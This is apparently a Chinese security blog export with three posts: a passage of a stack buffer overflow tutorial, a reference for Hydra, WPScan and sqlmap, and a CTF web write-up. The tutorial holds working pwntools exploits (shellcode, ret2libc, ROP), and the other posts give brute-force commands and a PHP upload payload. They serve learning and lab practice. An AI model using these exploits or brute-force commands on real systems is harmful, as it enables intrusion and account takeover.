<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x00\x00\x00\x00'</span>+<span class="string">'\x0c\xc0\x04\x08'</span>+<span class="string">'\x04\x00\x00\x00'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">'\x72\x91\x04\x08'</span>) <span class="comment">#address of shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>执行payload，反弹shell</strong></p>
<p><img src="/images/Buffer/10.png" alt="10"></p>
<h5 id="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"><a href="#–修改返回地址，让其指向溢出数据中的一段指令（shellcode）" class="headerlink" title="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"></a>–修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</h5><p>在溢出的数据内包含一段指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开<code>shell</code>。<code>shellcode</code>可以在网上搜索</p>
<p>前提：函数调用栈上的数据要有可执行的权限以及关闭内存布局随机化</p>
<ul>
<li>BSS段通常是指用来存放程序中未初始化的或者初始化为0的<a href="https://baike.baidu.com/item/%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/4725296" target="_blank" rel="noopener">全局变量</a>和<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F/10997955" target="_blank" rel="noopener">静态变量</a>的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%AE%B5" target="_blank" rel="noopener">数据段</a>、<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5" target="_blank" rel="noopener">代码段</a>（也称文本段）。</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用read_plt函数将函数的返回地址覆盖为BSS段的地址。</p>
<p><strong>payload：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul"</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x0804C020</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804C020</span>)</span><br><span class="line">payload += p32(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





<h5 id="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"><a href="#–修改返回地址，让其指向内存中已有的某个函数（return2libc）" class="headerlink" title="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"></a>–修改返回地址，让其指向内存中已有的某个函数（<strong>return2libc</strong>）</h5><p>在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于<strong>libc</strong>动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如<strong>system()</strong>等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 <strong>system()</strong> 函数打开 <strong>shell</strong> 的完整形式为 <strong>system(“/bin/sh”)</strong> ，所以溢出数据也要包括必要的参数。</p>
<p><img src="/images/Buffer/12.png" alt="12"></p>
<ul>
<li><strong>system()函数的地址</strong></li>
</ul>
<p>当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。如果操作系统打开了 <strong>ASLR</strong>，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 <strong>ASLR</strong> 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 <strong>system()</strong> 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
<p><strong>Code(32位）：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">128</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,s,<span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<strong>libc</strong>中可以找到s<strong>ystem()</strong>和<strong>/bin/sh</strong>的地址(为偏移量），利用第一次缓冲区溢出泄露地址，<strong>base+read_offset=read_addr</strong>，所以得到<strong>read_offset</strong>的地址，然后找出<strong>read_addr</strong>的地址，则</p>
<blockquote>
<p><strong>base=read_addr-ead_offset</strong></p>
<p><strong>system_addr=base+system_offset</strong></p>
</blockquote>
<p>在第二次缓冲区溢出时，程序会新开一个<strong>system</strong>进程，且需要调用的参数<strong>/bin/sh</strong>在栈中。</p>
<p><strong>payload1：</strong><code>padding + address of write_plt + address of vul + address of parameter write()</code></p>
<p><strong>payload2：</strong><code>padding + address of system() + address of dead+address of /bin/sh</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">"vul"</span>]) <span class="comment">#再次执行vul，造成第二次缓冲区溢出</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">128</span>)</span><br><span class="line">ret = io.recv(<span class="number">4</span>)</span><br><span class="line">read_addr = u32(ret) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">base = read_addr - read_offset</span><br><span class="line">system_addr = base + system_offset</span><br><span class="line">binsh_addr = base + binsh_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2  = <span class="string">"a"</span> * <span class="number">44</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming"><a href="#－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming" class="headerlink" title="－－修改返回地址，让其指向内存中已有的一段指令 –ROP ( Return Oriented Programming )"></a>－－修改返回地址，让其指向内存中已有的一段指令 –<strong>ROP ( Return Oriented Programming )</strong></h5><p>在64位程序中局部变量存储在栈中，函数的参数存储在寄存器中，无法通过代码来修改寄存器中的参数，但是可以通过指令去修改。</p>
<p>在内存中确定某段指令的地址，并用其覆盖返回地址。但是有时候目标函数在内存中无法找到特定的函数可以适配，这时需要在内存中寻找多个指令片段，拼凑处一系列操作。可以使用<strong>rp++</strong>来搜索以ret结尾的指令片段。</p>
<p><code>rp++ -f vul64 -r 5</code></p>
<p><img src="/images/Buffer/5.png" alt="5"></p>
<p><strong>payload:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc64.so.6"</span>)</span><br><span class="line"><span class="comment">#io = remote('127.0.0.1', 10001)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret =<span class="number">0x0400623</span> <span class="comment">#:pop rdi ; ret  ;  (1 found)</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00400621</span> <span class="comment">#: pop rsi ; pop r15 ; ret  ;  (1 found)</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"vul"</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">128</span>)</span><br><span class="line">ret = io.recv(<span class="number">8</span>)</span><br><span class="line">read_addr = u64(ret)</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = read_addr - read_offset</span><br><span class="line">system_addr = base + system_offset</span><br><span class="line">binsh_addr = base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<p>利用俩次缓冲区溢出来执行system(“/bin/sh”)</p>
<h4 id="0x40防御措施"><a href="#0x40防御措施" class="headerlink" title="0x40防御措施"></a>0x40防御措施</h4><p>通常情况下程序在默认编译设置下都会取消栈上数据的可执行权限，这样可以避免简单的<code>shellcode</code>溢出攻击。然后在操作系统中开启<strong>内存布局随机化</strong><code>（ASLR)</code>,这样可以增大确定堆栈内数据和动态库内存地址的难度。编译程序时还可以设置某些编译选项，使程序在运行时会在函数栈上的 ebp 地址和返回地址之间生成一个特殊的值，这个值被称为“金丝雀”。这样一旦发生了栈溢出并覆盖了返回地址，这个值就会被改写，从而实现函数栈的越界检查。</p>
]]></content>
      <categories>
        <category>Binary</category>
      </categories>
  </entry>
  <entry>
    <title>How to use Common tools</title>
    <url>/2019/01/21/How-to-use-Common-tools/</url>
    <content><![CDATA[<h4 id="Hydra暴力破解"><a href="#Hydra暴力破解" class="headerlink" title="Hydra暴力破解"></a><strong>Hydra暴力破解</strong></h4><p>1.破解telnet服务登陆账号和密码：</p>
<p><code>hydra 127.0.0.1 -l telnet -P dice.txt telnet</code></p>
<p><strong>命令解释：</strong></p>
<ul>
<li><p>​    被攻击主机IP：127.0.0.1：</p>
</li>
<li><p>​    -l:指定登陆账号，大写-L可以指定文件进行账号破解</p>
</li>
<li><p>​    -P：指定要破解的密码字典，小写-p指定具体的密码</p>
</li>
</ul>
<a id="more"></a>

<p>2.破解ssh服务登陆账号和密码：</p>
<p><code>hydra  127.0.0.1 -l root -P dict.txt ssh</code></p>
<p>3.破解smb服务登陆账号和密码：</p>
<p><code>hydra 127.0.0.1 -l root -P dict.txt smb</code></p>
<p>4.破解pop3服务登陆账号和密码：</p>
<p><code>hydra -l root -P dict.txt my.pop3.mail pop3</code></p>
<p>5.破解http-proxy服务登陆账号和密码:</p>
<p><code>hydra -l root -P dict.txt http-proxy://127.0.0.1</code></p>
<p>6.破解RDP服务登陆账号和密码:</p>
<p><code>hydra -l root -P dict.txt 127.0.0.1 rdp</code></p>
<p>7.破解imap服务登陆账号和密码:</p>
<p><code>hydra -l root -P dict.txt 127.0.0.1 imap</code></p>
<h4 id="WPscan"><a href="#WPscan" class="headerlink" title="WPscan"></a><strong>WPscan</strong></h4><ul>
<li><strong>介绍：</strong></li>
</ul>
<p>WPScan是一个扫描WordPress漏洞的黑盒子扫描器，它可以为所有Web开发人员扫描WordPress 漏洞并在他们开发前找到并解决问题。该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的wordpress站点暴力破解用户名密码。</p>
<p><strong>1.常用参数选项</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--update  更新到最新版本</span><br><span class="line"> </span><br><span class="line">--url   | -u <span class="tag">&lt;<span class="name">target</span> <span class="attr">url</span>&gt;</span>  要扫描的`WordPress`站点.</span><br><span class="line"> </span><br><span class="line">--force | -f   不检查网站运行的是不是`WordPress`</span><br><span class="line"> </span><br><span class="line">--enumerate | -e [option(s)]  枚举</span><br></pre></td></tr></table></figure>



<p><strong>2.option</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">u 枚举用户名，默认从1-10</span><br><span class="line"></span><br><span class="line">u[10-20] 枚举用户名，配置从10-20</span><br><span class="line"></span><br><span class="line">p 枚举插件</span><br><span class="line"></span><br><span class="line">vp 只枚举有漏洞的插件</span><br><span class="line"></span><br><span class="line">ap 枚举所有插件，时间较长</span><br><span class="line"></span><br><span class="line">tt 列举缩略图相关的文件</span><br><span class="line"></span><br><span class="line">t 枚举主题信息</span><br><span class="line"></span><br><span class="line">vt 只枚举存在漏洞的主题</span><br><span class="line"></span><br><span class="line">at 枚举所有主题，时间较长</span><br><span class="line"></span><br><span class="line">可以指定多个扫描选项，例："-e tt,p"</span><br><span class="line"></span><br><span class="line">如果没有指定选项，默认选项为："vt,tt,u,vp"</span><br><span class="line"></span><br><span class="line">--exclude-content-based "&lt;regexp or string&gt;"</span><br><span class="line"></span><br><span class="line">当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹</span><br><span class="line"></span><br><span class="line">--config-file | -c &lt;config file使用指定的配置文件</span><br><span class="line"></span><br><span class="line">--user-agent | -a &lt;User-Agent指定User-Agent</span><br><span class="line"></span><br><span class="line">--cookie &lt;String指定cookie</span><br><span class="line"></span><br><span class="line">--random-agent | -r 使用随机User-Agent</span><br><span class="line"></span><br><span class="line">--follow-redirection 如果目标包含一个重定向，则直接跟随跳转</span><br><span class="line"></span><br><span class="line">--batch 无需用户交互，都使用默认行为</span><br><span class="line"></span><br><span class="line">--no-color 不要采用彩色输出</span><br><span class="line"></span><br><span class="line">--wp-content-dir &lt;wp content dirWPScan会去发现wp-content目录，用户可手动指定</span><br><span class="line"></span><br><span class="line">--wp-plugins-dir &lt;wp plugins dir指定wp插件目录，默认是wp-content/plugins</span><br><span class="line"></span><br><span class="line">--proxy &lt;[protocol://]host:port设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议</span><br><span class="line"></span><br><span class="line">--proxy-auth &lt;username:password设置代理登陆信息</span><br><span class="line"></span><br><span class="line">--basic-auth &lt;username:password设置基础认证信息</span><br><span class="line"></span><br><span class="line">--wordlist | -w &lt;wordlist指定密码字典</span><br><span class="line"></span><br><span class="line">--username | -U &lt;username指定爆破的用户名</span><br><span class="line"></span><br><span class="line">--usernames &lt;path-to-file指定爆破用户名字典</span><br><span class="line"></span><br><span class="line">--threads | -t &lt;number of threads指定多线程</span><br><span class="line"></span><br><span class="line">--cache-ttl &lt;cache-ttl设置 cache TTL</span><br><span class="line"></span><br><span class="line">--request-timeout &lt;request-timeout请求超时时间</span><br><span class="line"></span><br><span class="line">--connect-timeout &lt;connect-timeout连接超时时间</span><br><span class="line"></span><br><span class="line">--max-threads &lt;max-threads最大线程数</span><br><span class="line"></span><br><span class="line">--throttle &lt;milliseconds当线程数设置为1时，设置两个请求之间的间隔</span><br><span class="line"></span><br><span class="line">--help | -h 输出帮助信息</span><br><span class="line"></span><br><span class="line">--verbose | -v 输出Verbose</span><br><span class="line"></span><br><span class="line">--version 输出当前版本</span><br></pre></td></tr></table></figure>



<p><strong>3.使用方法：</strong></p>
<ul>
<li><p>扫描Wordpress漏洞</p>
<p><code>wpscan --url https://www.xxx.xxx</code></p>
</li>
<li><p>扫描Wordpress用户，对其进行枚举</p>
<p><code>wpscan --url https://www.xxxxx.xxx/ --enumerate u</code></p>
<p>可以得到用户的信息</p>
<p><img src="/2019/01/21/How-to-use-Common-tools/common_tool/1.png" alt="1"></p>
</li>
<li><p>暴力破解得到密码：</p>
<p><code>wpscan --url https://www.xxx.xxx/ -e u  --passwords dict.txt --usernames 用户名</code></p>
</li>
<li><p>扫描插件漏洞</p>
<p><code>wpscan -u https://www.xxx.xxx/ -enumerate p</code>              扫描安装的插件</p>
<p><code>wpscan --url https://www.xxx.xxx/ --enumerate vp</code>    扫描目标插件漏洞</p>
</li>
<li><p>主题漏洞扫描</p>
<p><code>wpscan --url https://www.xxx.xxx/ --enumerate t</code> 对主题进行扫描</p>
<p><code>wpscan --url https://www.xxx.xxx/ --enumerate vt</code> 扫描主题中存在的漏洞</p>
</li>
</ul>
<h4 id="Sqlmap使用说明"><a href="#Sqlmap使用说明" class="headerlink" title="Sqlmap使用说明"></a>Sqlmap使用说明</h4><ol>
<li><strong>Options（选项）：</strong><br>–version             显示程序的版本号并退出<br>-h, –help            显示此帮助消息并退出<br>-v VERBOSE            详细级别：0-6（默认为1） </li>
<li><strong>Target（目标）：</strong><br>以下至少需要设置其中一个选项，设置目标URL。<br>-d DIRECT           直接连接到数据库。<br>-u URL, –url=URL   目标URL。<br>-l LIST             从Burp或WebScarab代理的日志中解析目标。<br>-r REQUESTFILE      从一个文件中载入HTTP请求。<br>-g GOOGLEDORK       处理Google dork的结果作为目标URL。<br>-c CONFIGFILE       从INI配置文件中加载选项。 </li>
<li><strong>Request（请求）：</strong><br>​    这些选项可以用来指定如何连接到目标URL。<br>–data=DATA         通过POST发送的数据字符串<br>–cookie=COOKIE     HTTP Cookie头<br>–cookie-urlencode  URL 编码生成的cookie注入<br>–drop-set-cookie   忽略响应的Set - Cookie头信息<br>–user-agent=AGENT  指定  HTTP User - Agent头<br>–random-agent      使用随机选定的HTTP User - Agent头<br>–referer=REFERER   指定  HTTP Referer头<br>–headers=HEADERS   换行分开，加入其他的HTTP头<br>–auth-type=ATYPE   HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)<br>–auth-cred=ACRED   HTTP身份验证凭据（用户名:密码）<br>–auth-cert=ACERT   HTTP认证证书（key_file，cert_file）<br>–proxy=PROXY       使用HTTP代理连接到目标URL  –proxy http  ://127.0.0.1:8888<br>–proxy-cred=PCRED  HTTP代理身份验证凭据（用户名：密码）<br>–ignore-proxy      忽略系统默认的HTTP代理<br>–delay=DELAY       在每个HTTP请求之间的延迟时间，单位为秒  –delay 0.5<br>–timeout=TIMEOUT   等待连接超时的时间（默认为30秒）<br>–retries=RETRIES   连接超时后重新连接的时间（默认3）<br>–scope=SCOPE       从所提供的代理日志中过滤器目标的正则表达式<br>–safe-url=SAFURL   在测试过程中经常访问的url地址<br>–safe-freq=SAFREQ  两次访问之间测试请求，给出安全的URL<br><strong>Optimization（优化）：</strong><br>   这些选项可用于优化SqlMap的性能。<br>​    -o                  开启所有优化开关<br>–predict-output    预测常见的查询输出<br>–keep-alive        使用持久的HTTP（S）连接<br>–null-connection   从没有实际的HTTP响应体中检索页面长度<br>–threads=THREADS   最大的HTTP（S）请求并发量（默认为1） </li>
<li><strong>Injection（注入）：</strong><br>​    这些选项可以用来指定测试哪些参数，  提供自定义的注入payloads和可选篡改脚本。<br>​    -p TESTPARAMETER    可测试的参数（S）<br>–dbms=DBMS         强制后端的DBMS为此值 如：–dbms “Mysql”<br>–os=OS             强制后端的DBMS操作系统为这个值<br>–prefix=PREFIX     注入payload字符串前缀<br>–suffix=SUFFIX     注入payload字符串后缀<br>–tamper=TAMPER     使用给定的脚本（S）篡改注入数据 </li>
<li><strong>Detection（检测）：</strong><br>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。<br>–level=LEVEL       执行测试的等级（1-5，默认为1）<br>–risk=RISK         执行测试的风险（0-3，默认为1）<br>–string=STRING     查询时有效时在页面匹配字符串<br>–regexp=REGEXP     查询时有效时在页面匹配正则表达式<br>–text-only         仅基于在文本内容比较网页 </li>
<li><strong>Techniques（技巧）：</strong><br> 这些选项可用于调整具体的SQL注入测试。<br>–technique=TECH    SQL注入技术测试（默认BEUST）<br>–time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）<br>–union-cols=UCOLS  定列范围用于测试UNION查询注入<br>–union-char=UCHAR  用于暴力猜解列数的字符 </li>
<li><strong>Fingerprint（指纹）：</strong><br>-f, –fingerprint     执行检查广泛的DBMS版本指纹 </li>
<li><strong>Enumeration（枚举）：</strong><br>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己<br>的SQL语句。<br>-b, –banner        检索数据库管理系统的标识<br>–current-user      检索数据库管理系统当前用户<br>–current-db        检索数据库管理系统当前数据库<br>–is-dba            检测DBMS当前用户是否DBA<br>–users             枚举数据库管理系统用户<br>–passwords         枚举数据库管理系统用户密码哈希<br>–privileges        枚举数据库管理系统用户的权限<br>–roles             枚举数据库管理系统用户的角色<br>–dbs               枚举数据库管理系统数据库<br>–tables            枚举的DBMS数据库中的表<br>–columns           枚举DBMS数据库表列<br>–dump              转储数据库管理系统的数据库中的表项<br>–dump-all          转储所有的DBMS数据库表中的条目<br>–search            搜索列（S），表（S）和/或数据库名称（S）<br>​    -D DB               要进行枚举的数据库名<br>​    -T TBL              要进行枚举的数据库表<br>​    -C COL              要进行枚举的数据库列<br>​    -U USER             用来进行枚举的数据库用户<br>–exclude-sysdbs    枚举表时排除系统数据库<br>–start=LIMITSTART  第一个查询输出进入检索<br>–stop=LIMITSTOP    最后查询的输出进入检索<br>–first=FIRSTCHAR   第一个查询输出字的字符检索<br>–last=LASTCHAR     最后查询的输出字字符检索<br>–sql-query=QUERY   要执行的SQL语句<br>–sql-shell         提示交互式SQL的shell </li>
<li><strong>Brute force（蛮力）：</strong><br>​    这些选项可以被用来运行蛮力检查。<br>–common-tables     检查存在共同表<br>–common-columns    检查存在共同列<br>  User-defined function injection（用户自定义函数注入）：<br>​    这些选项可以用来创建用户自定义函数。<br>–udf-inject        注入用户自定义函数<br>–shared-lib=SHLIB  共享库的本地路径<br>File system access（访问文件系统）：<br>​    这些选项可以被用来访问后端数据库管理系统的底层文件系统。<br>–file-read=RFILE   从后端的数据库管理系统文件系统读取文件<br>–file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件<br>–file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径<br>Operating system access（操作系统访问）：<br>​    这些选项可以用于访问后端数据库管理系统的底层操作系统。<br>–os-cmd=OSCMD      执行操作系统命令<br>–os-shell          交互式的操作系统的shell<br>–os-pwn            获取一个OOB shell，meterpreter或VNC<br>–os-smbrelay       一键获取一个OOB shell，meterpreter或VNC<br>–os-bof            存储过程缓冲区溢出利用<br>–priv-esc          数据库进程用户权限提升<br>–msf-path=MSFPATH  Metasploit Framework本地的安装路径<br>–tmp-path=TMPPATH  远程临时文件目录的绝对路径 </li>
<li><strong>Windows注册表访问：</strong><br>   这些选项可以被用来访问后端数据库管理系统Windows注册表。<br>–reg-read          读一个Windows注册表项值<br>–reg-add           写一个Windows注册表项值数据<br>–reg-del           删除Windows注册表键值<br>–reg-key=REGKEY    Windows注册表键<br>–reg-value=REGVAL  Windows注册表项值<br>–reg-data=REGDATA  Windows注册表键值数据<br>–reg-type=REGTYPE  Windows注册表项值类型 </li>
<li><strong>General（一般）：</strong><br>这些选项可以用来设置一些一般的工作参数。<br>​    -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中<br>​    -s SESSIONFILE      保存和恢复检索会话文件的所有数据<br>–flush-session     刷新当前目标的会话文件<br>–fresh-queries     忽略在会话文件中存储的查询结果<br>–eta               显示每个输出的预计到达时间<br>–update            更新SqlMap<br>–save              file保存选项到INI配置文件<br>–batch             从不询问用户输入，使用所有默认配置。 </li>
<li><strong>Miscellaneous（杂项）：</strong><br>–beep              发现SQL注入时提醒<br>–check-payload     IDS对注入payloads的检测测试<br>–cleanup           SqlMap具体的UDF和表清理DBMS<br>–forms             对目标URL的解析和测试形式<br>–gpage=GOOGLEPAGE  从指定的页码使用谷歌dork结果<br>–page-rank         Google dork结果显示网页排名（PR）<br>–parse-errors      从响应页面解析数据库管理系统的错误消息<br>–replicate         复制转储的数据到一个sqlite3数据库<br>–tor               使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>–wizard            给初级用户的简单向导界面</li>
</ol>
]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>部分CTF解题思路</title>
    <url>/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h4 id="Who-are-you？"><a href="#Who-are-you？" class="headerlink" title="Who are you？"></a>Who are you？</h4><p>首先拿到这道题打开网页以后只有一句<code>Sorry. You have no permissions.</code></p>
<p>既然没有提示那么就有可能存在以下几种可能：</p>
<ul>
<li>敏感文件泄露</li>
<li>跳转</li>
<li>cookie / session</li>
</ul>
<p>扫描器扫描的结果为</p>
<a id="more"></a>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/1.png" alt="1"></p>
<p>在抓包时也没有发生跳转</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/2.png" alt="2"></p>
<p>但是注意到Cookie中有一段字符串：<code>Zjo1OiJ0aHJmZyI7</code>，尝试下Base64得到<code>f:5:&quot;thrfg&quot;;</code></p>
<p>然后再次尝试Rot13解密发现<code>thrfg</code>是<strong>gues</strong>t的Rot13,所以这下就可以试着将<strong>guest</strong>换成<strong>admin</strong>然后更改Cookie得到</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/3.png" alt="3"></p>
<p>查看源代码后看到提示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[<span class="string">'filename'</span>]; $data = $_POST[<span class="string">'data'</span>]; --&gt;</span><br></pre></td></tr></table></figure>

<p>应该是文件上传，但确是用POST模拟的，data为php的内容使用该格式上传</p>
<p><a href="https://www.jianshu.com/p/90473b8e6667" target="_blank" rel="noopener">参考：PHP一句话木马</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="number">1.</span>php&amp;data[]=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>依然使用Burp将GET改为POST，切记加入<strong>Content-Type: application/x-www-form-urlencoded</strong></p>
<p>最后得到</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/4.png" alt="4"></p>
<h4 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h4><p>拿到题目SQLI结合用户登录界面可以想到多半是sql注入，</p>
